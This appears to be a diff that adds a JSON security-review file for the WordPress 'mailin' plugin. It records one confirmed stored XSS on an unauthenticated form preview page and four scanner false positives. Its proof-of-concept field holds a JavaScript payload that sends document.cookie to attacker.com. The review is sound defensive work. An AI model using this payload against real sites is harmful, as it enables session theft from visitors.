@@ -1,0 +1,74 @@
+{
+  "plugin": "mailin",
+  "reviewed_at": "2026-06-16",
+  "reviewer_notes": "Manual taint-trace of all 5 automated findings. Traced each source-sink chain independently through the source. SSRF false positive confirmed (hardcoded URL). Three push-admin XSS flows confirmed as false positives (sink outputs only the constant string 'selected=\"selected\"', never user data). One XSS confirmed: JavaScript injection in unauthenticated form preview page.",
+  "verdicts": [
+    {
+      "flow_id": "mailin-ssrf-001",
+      "original_severity": "medium",
+      "verdict": "FALSE_POSITIVE",
+      "confidence": "high",
+      "vuln_class": "ssrf",
+      "reasoning": "The taint scanner incorrectly tagged this as SSRF. The sink is `wp_remote_post(self::TURNSTILE_SITE_VERIFY, $headers)`. TURNSTILE_SITE_VERIFY is a class constant defined at sendinblue.php:135 as 'https://challenges.cloudflare.com/turnstile/v0/siteverify' — a hardcoded, attacker-immutable value. The tainted data ($formData from get_option) flows only into the POST body parameters (the 'body' array), not into the URL. wp_remote_post only makes the request to the fixed Cloudflare URL regardless of body contents. There is no SSRF here: an attacker cannot redirect the outbound HTTP request to an arbitrary host.",
+      "auth_required": false,
+      "nonce_verified": true
+    },
+    {
+      "flow_id": "mailin-xss-001",
+      "original_severity": "high",
+      "verdict": "CONFIRMED",
+      "confidence": "high",
+      "vuln_class": "stored_xss_js_injection",
+      "title": "Stored XSS via JavaScript Injection in Turnstile Captcha Theme Parameter (Unauthenticated Preview Page)",
+      "description": "In inc/sib-form-preview.php:74, the value $cCaptchaStyle is echoed directly inside a <script> block as the value of the `theme:` property in a Turnstile render() call: `theme: <?php echo $cCaptchaStyle; ?>,`. No escaping is applied. The value originates from a stored form's cCaptchaStyle database column. At write time (page-form.php:988), sanitize_text_field() is applied, which strips HTML tags but does NOT prevent JavaScript injection — characters like `\"`, `,`, `(`, `)`, `;`, newlines are preserved. The preview URL (?sib_form=N) is processed by sib_parse_request() with NO authentication check and NO nonce verification. Any user (including unauthenticated visitors) can request the preview of any form. An administrator who saves a form with a malicious cCaptchaStyle value will cause XSS to execute in the browser of any user who views the preview page for that form.",
+      "affected_file": "plugins/src/mailin/inc/sib-form-preview.php",
+      "affected_line": 74,
+      "sink_expression": "echo $cCaptchaStyle;",
+      "taint_source": "cCaptchaStyle column in mailin_forms DB table, written by save_setting_subscription() in page/page-form.php:988",
+      "write_auth_required": true,
+      "write_capability_required": "manage_options (administrator)",
+      "read_auth_required": false,
+      "nonce_on_read": false,
+      "entry_point": "GET /?sib_form=<form_id> (no action param triggers DB path via SIB_Forms::getForm)",
+      "stored_or_reflected": "Stored (payload written to DB on form save, served on every unauthenticated preview view)",
+      "exploitability_note": "Write is admin-only, making this admin-to-any-visitor XSS. In typical WP security models this is Low-Medium severity since admins are trusted, but the unauthenticated exposure surface elevates it. Could be used to deliver drive-by XSS to front-end visitors via the preview URL.",
+      "cvss_v3": "4.8 (CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N)",
+      "sanitizer_applied_at_write": "sanitize_text_field() — strips HTML tags only, does not neutralize JS injection in script context",
+      "sanitizer_missing_at_read": "esc_js() or json_encode() around the echoed value",
+      "poc_sketch": "1. Admin saves a form with turnstile_captcha_theme set to: light\",callback:function(){fetch('https://attacker.com/?c='+document.cookie)},x:\"  2. Navigate to /?sib_form=<form_id> (unauthenticated).  3. JS executes in victim browser."
+    },
+    {
+      "flow_id": "mailin-xss-002",
+      "original_severity": "medium",
+      "verdict": "FALSE_POSITIVE",
+      "confidence": "high",
+      "vuln_class": "xss",
+      "reasoning": "The taint scanner flags line 306 of push-admin.php: `echo array_search($segment['id'], $target_brevo_segment_ids) !== false ? 'selected=\"selected\"' : ''`. The PHP ternary expression can only produce two outputs: the hardcoded string constant 'selected=\"selected\"' or the empty string ''. The `array_search()` function returns either the found key (a numeric array index) or false — neither of which is echoed. The user-tainted data ($target_brevo_segment_ids from post meta) is only used as a parameter to array_search(), never reflected into output. This is a false positive: no user-controlled string reaches the HTML output at this line. The segment IDs in $all_brevo_segments come from the Brevo API (external source), but they're used as comparison keys and the option value output (line 307: `echo $segment['id']`) would be a separate concern — and those values come from Brevo's API, an attacker-controlled external service, which is too speculative for a high-confidence finding.",
+      "auth_required": true,
+      "nonce_verified": true
+    },
+    {
+      "flow_id": "mailin-xss-003",
+      "original_severity": "medium",
+      "verdict": "FALSE_POSITIVE",
+      "confidence": "high",
+      "vuln_class": "xss",
+      "reasoning": "Structurally identical false positive to mailin-xss-002. Line 336: `echo array_search($list['id'], $target_brevo_list_ids) !== false ? 'selected=\"selected\"' : ''`. The ternary output is always one of two hardcoded string constants. The tainted $target_brevo_list_ids is used only as the needle/haystack operand of array_search(), whose return value is never reflected. No user-controlled data reaches the HTML sink.",
+      "auth_required": true,
+      "nonce_verified": true
+    },
+    {
+      "flow_id": "mailin-xss-004",
+      "original_severity": "medium",
+      "verdict": "FALSE_POSITIVE",
+      "confidence": "high",
+      "vuln_class": "xss",
+      "reasoning": "Structurally identical false positive to mailin-xss-002 and mailin-xss-003. Line 362: `echo array_search($tag, $target_tags) !== false ? 'selected=\"selected\"' : ''`. The return value of array_search() is a boolean or integer key — it is only used in the comparison, not echoed. The only output is the constant string 'selected=\"selected\"' or empty string. However, note that line 363 also echoes `value=\"<?php echo $tag ?>\"` and `><?php echo $tag ?>` without escaping, where $tag comes from $all_tags (Brevo API via SIB_Push_Utils::list_tags). This is a meta-box rendered only in wp-admin for logged-in admins — the external API would need to be compromised to deliver malicious tag names. Too speculative for high confidence.",
+      "auth_required": true,
+      "nonce_verified": true
+    }
+  ],
+  "summary": "1 confirmed vulnerability, 4 false positives. The confirmed finding is a stored XSS via JS injection in the Turnstile captcha theme parameter, exploitable on the unauthenticated form preview page. Write requires admin privileges; read is fully unauthenticated. SSRF flagged by scanner is not valid (hardcoded URL). All three push-admin XSS flows are false positives where the scanner misidentified the output of a ternary expression as reflecting user data.",
+  "confirmed_count": 1,
+  "false_positive_count": 4
+}
